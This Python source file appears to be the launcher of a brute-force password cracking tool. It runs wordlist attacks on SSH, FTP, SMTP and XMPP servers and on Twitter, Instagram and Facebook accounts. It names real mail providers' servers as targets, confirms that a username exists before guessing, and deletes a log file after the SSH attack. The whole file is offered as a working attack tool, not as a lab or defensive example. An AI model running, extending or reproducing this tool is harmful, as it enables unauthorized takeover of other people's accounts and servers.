#!/usr/bin/env python3
import os
import sys
import socket
import pip
from time import sleep
from subprocess import call
import argparse

# Import custom libraries
from src.sshLib import sshBruteforce
from src.ftpLib import ftpBruteforce
from src.smtpLib import smtpBruteforce
from src.twitterLib import twitUserCheck, twitterBruteforce
from src.instagramLib import instUserCheck, instagramBruteforce
from src.xmppLib import xmppBruteforce
from src.facebookLib import facebookBruteforce

# Define colors for output
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

# Ensure necessary packages are installed
try:
    import selenium
    import paramiko
    import xmpp
    import fbchat
except ImportError:
    print(f"{R}You are missing dependencies! They will be installed for you with pip.{W}")
    print("Loading...")
    sleep(3)
    pip.main(["install", "argparse", "selenium", "paramiko", "xmpppy", "fbchat"])

def get_args():
    parser = argparse.ArgumentParser(description='Server-side bruteforce module written in Python')
    required = parser.add_argument_group('required arguments')
    required.add_argument('-s', '--service', dest='service', help="Service being attacked (e.g., ssh, ftp, smtp, twitter, instagram, xmpp, facebook)", required=True)
    required.add_argument('-u', '--username', dest='username', help='Username for the service', required=True)
    required.add_argument('-w', '--wordlist', dest='wordlist', help='Path to the wordlist file', required=True)
    parser.add_argument('-a', '--address', dest='address', help='Host address for the service')
    parser.add_argument('-p', '--port', type=int, dest='port', help='Port for the service')
    parser.add_argument('-d', '--delay', type=int, dest='delay', default=1, help='Delay in seconds between attempts (default: 1)')

    args = parser.parse_args()
    return args.service, args.username, args.wordlist, args.address, args.port, args.delay

def main():
    service, username, wordlist, address, port, delay = get_args()

    print(f"{G}[*] Username: {username}{W}")
    sleep(0.5)
    print(f"{G}[*] Wordlist: {wordlist}{W}")
    sleep(0.5)
    if not os.path.exists(wordlist):
        print(f"{R}[!] Wordlist not found!{W}")
        sys.exit()
    print(f"{C}[*] Service: {service}{W}")
    sleep(0.5)

    # Service-specific handling
    if service == 'ssh':
        if address is None:
            print(f"{R}[!] You need to provide an SSH address for cracking!{W}")
            sys.exit()
        print(f"{C}[*] Address: {address}{W}")
        sleep(0.5)
        port = port if port is not None else 22
        print(f"{C}[*] Port: {port}{W}")
        sleep(1)
        print(f"{P}[*] Starting dictionary attack!{W}")
        print(f"Using {delay} seconds of delay. Default is 1 second")
        sshBruteforce(address, username, wordlist, port, delay)
        call(["rm", "filename.log"])

    elif service == 'ftp':
        if address is None:
            print(f"{R}[!] You need to provide an FTP address for cracking!{W}")
            sys.exit()
        print(f"{C}[*] Address: {address}{W}")
        sleep(0.5)
        port = port if port is not None else 21
        print(f"{C}[*] Port: {port}{W}")
        sleep(1)
        print(f"{P}[*] Starting dictionary attack!{W}")
        print(f"Using {delay} seconds of delay. Default is 1 second")
        ftpBruteforce(address, username, wordlist, delay, port)

    elif service == 'smtp':
        if address is None:
            print(f"{R}[!] You need to provide an SMTP server address for cracking!{W}")
            print(f"{O}| Gmail: smtp.gmail.com |\n| Outlook: smtp.live.com |\n| Yahoo Mail: smtp.mail.yahoo.com |\n| AOL: smtp.aol.com |{W}")
            sys.exit()
        print(f"{C}[*] SMTP server: {address}{W}")
        sleep(0.5)
        port = port if port is not None else 587
        print(f"{C}[*] Port: {port}{W}")
        sleep(1)
        print(f"{P}[*] Starting dictionary attack!{W}")
        print(f"Using {delay} seconds of delay. Default is 1 second")
        smtpBruteforce(address, username, wordlist, delay, port)

    elif service == 'xmpp':
        if address is None:
            print(f"{R}[!] NOTE: You need to include a server address for cracking XMPP!{W}")
            print(f"{O}| Example: cypherpunks.it | inbox.im | creep.im |{W}")
            sys.exit()
        print(f"{C}[*] XMPP server: {address}{W}")
        sleep(0.5)
        port = port if port is not None else 5222
        print(f"{C}[*] Port: {port}{W}")
        sleep(1)
        print(f"{P}[*] Starting dictionary attack!{W}")
        print(f"Using {delay} seconds of delay. Default is 1 second")
        xmppBruteforce(address, port, username, wordlist, delay)

    elif service == 'twitter':
        if address or port:
            print(f"{R}[!] NOTE: You don't need to provide an address or port for Twitter!{W}")
            sys.exit()
        print(f"{P}[*] Checking if username exists...{W}")
        if twitUserCheck(username) == 1:
            print(f"{R}[!] The username was not found! Exiting...{W}")
            sys.exit()
        print(f"{G}[*] Username found! Continuing...{W}")
        sleep(1)
        twitterBruteforce(username, wordlist, delay)

    elif service == 'instagram':
        if address or port:
            print(f"{R}[!] NOTE: You don't need to provide an address or port for Instagram!{W}")
            sys.exit()
        print(f"{P}[*] Checking if username exists...{W}")
        if instUserCheck(username) == 1:
            print(f"{R}[!] The username was not found! Exiting...{W}")
            sys.exit()
        print(f"{G}[*] Username found! Continuing...{W}")
        sleep(1)
        print(f"{P}[*] Starting dictionary attack!{W}")
        print(f"Using {delay} seconds of delay. Default is 1 second")
        instagramBruteforce(username, wordlist, delay)

    elif service == 'facebook':
        print(f"{O}[*] This Facebook bruteforce module is experimental. You will need to provide a Facebook ID instead of a username. Sorry!{W}")
        sleep(2)
        if address or port:
            print(f"{R}[!] NOTE: You don't need to provide an address or port for Facebook!{W}")
            sys.exit()
        print(f"{P}[*] Starting dictionary attack!{W}")
        print(f"Using {delay} seconds of delay. Default is 1 second")
        facebookBruteforce(username, wordlist, delay)

if __name__ == '__main__':
    main()
